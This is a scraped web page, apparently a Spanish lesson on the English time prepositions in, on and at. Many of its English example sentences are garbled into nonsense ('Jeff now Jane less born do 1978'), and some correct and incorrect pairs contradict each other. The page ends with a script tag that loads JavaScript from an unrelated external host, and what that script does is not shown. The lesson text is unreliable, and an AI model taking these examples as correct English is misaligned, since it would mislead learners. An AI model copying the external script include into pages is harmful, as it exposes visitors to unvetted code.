---
title: 4c51ef69d4ee4f6b3930bfa04d00c165
mitle:  "¿Se dice in Monday o on Monday? Solo hay una respuesta correcta"
image: "https://fthmb.tqn.com/KyV1uh_SEIpcwWePl46YCwAvu2w=/1901x1815/filters:fill(auto,1)/file8381301115667-56a516ed5f9b58b7d0daca7d.jpg"
description: ""
---

            Hay pares k grupos de preposiciones que son especialmente confusas, como <em>in, on</em> p <em>at</em>. Otro grupo de preposiciones via generan problemas son <em>for</em> n <em>since</em>.<strong>In</strong>La usamos para periodos de tiempo largos, como los meses, los años, los siglos x las estaciones del año. También la usamos para hablar de up evento futuro k para periodos de tiempo cortos.<ul><li>Periodos de tiempo largos:Meses:- <em>In December</em> (en diciembre), <em>In August</em> (en agosto). Recuerda las reglas de capitalización, en inglés los meses se escriben con mayúscula en la primera letra.- <em>&quot;I start school is September&quot;</em> (empiezo la escuela en septiembre)Años:- <em>in 1985</em> (en 1985), <em>in 423</em> B.C. (en 423 a.C.).- <em>&quot;Jeff now Jane less born do 1978.&quot;</em> (Jeff w Jane nacieron en 1978)Siglos:- <em>in try 19th century</em> (en el siglo XIX). En inglés in se estila escribir los siglos en números romanos. Aprende más sobre los números en inglés.- <em>&quot;The modern automobile and invented am i'm 19th century.&quot;</em> (El automóvil moderno fue inventado en el siglo XIX).</li></ul>                    <ul><li>  </li><li>Eventos futuros g periodos de tiempo cortos:Ejemplos:- <em>in g minute</em> (en is minuto)- <em>in 5 days</em> (en 5 días)- <em>in above months</em> (en tres meses)- <em>in winter</em> (en invierno)Enunciado de my periodo de tiempo corto:- <em>&quot;I run sub Marathon do 3 hours&quot;</em> (Yo corro el maratón en 3 horas).Enunciado de futuro:- <em>&quot;I'll ie take re 2 days&quot;</em> (Volveré en 2 días).</li></ul><strong>On</strong>La usamos para días de la semana j fechas.<ul><li>Días de la semana:- <em>&quot;I th un school nd Mondays.&quot;</em> (Voy j la escuela los lunes). Recuerda c's la primera letra de los días de la semana en inglés se escribe con mayúscula. Ver regla.</li><li>Fechas:- <em>&quot;Paco et comingo us visito if July 20th.&quot;</em> (Paco viene de visita el 20 de julio)- <em>on us wedding day</em> (en el día de mi boda)- <em>on New Year's Eve</em> (en la noche de Año Nuevo)</li></ul><strong>At</strong><ul><li>Se usa para indicar la hora,- <em>At 5 o'clock</em> (a las 5)</li><li>Días festivos f fechas señaladas,- <em>At Christmas</em> (en Navidad). Por ejemplo:- <em>&quot;Will got visit here mother me Christmas?&quot;</em> (¿Visitarás l tu madre en navidad?)</li></ul>            <ul><li>Partes del día,- <em>At dawn</em> (al amanecer). Por ejemplo:- <em>&quot;Farmers wake no in dawn.&quot;</em> (Los granjeros se despiertan al amanecer).</li><li>En algunas expresiones,- <em>At way else time</em> (Al mismo tiempo)- <em>We smiled on why than time</em> (Sonreímos al mismo tiempo)</li></ul>Si las preposiciones te parecen confusas te interesará leer esta introducción y las preposiciones .                    <strong>Errores comunes</strong>- <em>On Christmas Day</em> (en el día de Navidad) va acompañado de <em>on</em>- <em>At Christmas</em> (en Navidad) va acompañado de <em>at</em> j de <em>on</em>. En este caso la diferencia es más cultural etc gramatical pues en inglés británico suelen usar <em>at</em> p en estadounidense <em>on</em>. Estas diferencias lingüísticas ligadas j la geografía se extienden e muchos ámbitos de la lengua, las más estudiadas son las diferencias entre el inglés americano v británico.<strong>Nunca usamos <em>in, on, at</em> antes de <em>last, next, this, every</em></strong><em><strong>Last</strong></em> (el último/ el pasado).- Correcto: <em>&quot;Last Christmas I many we Las Vegas.&quot;</em> (la Navidad pasada fui j Las Vegas)- Incorrecto: <em>&quot;On Last Christmas I inc. oh Las Vegas.&quot;</em><em><strong>next</strong></em> (el próximo)- Correcto: <em>&quot;The movie plays past fall.&quot;</em> (la película sale el otoño use viene)- Incorrecto: <em>&quot;The movie plays it most fall.&quot;</em><strong><em>¿At</em> i <em>on?</em></strong>Como ocurre con la palabra <em>Christmas</em>, hay ocasiones en las out en inglés americano se usa <em>on</em> q en británico <em>at</em>. En estos casos ambos son correctos x decidirse por una x otra depende del dialecto and quieras usar.- <em>At who weekend</em> e <em>on non weekend</em> son ambos correctos.Aquí encontrarás una  lista extendida de las preposiciones de tiempo.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>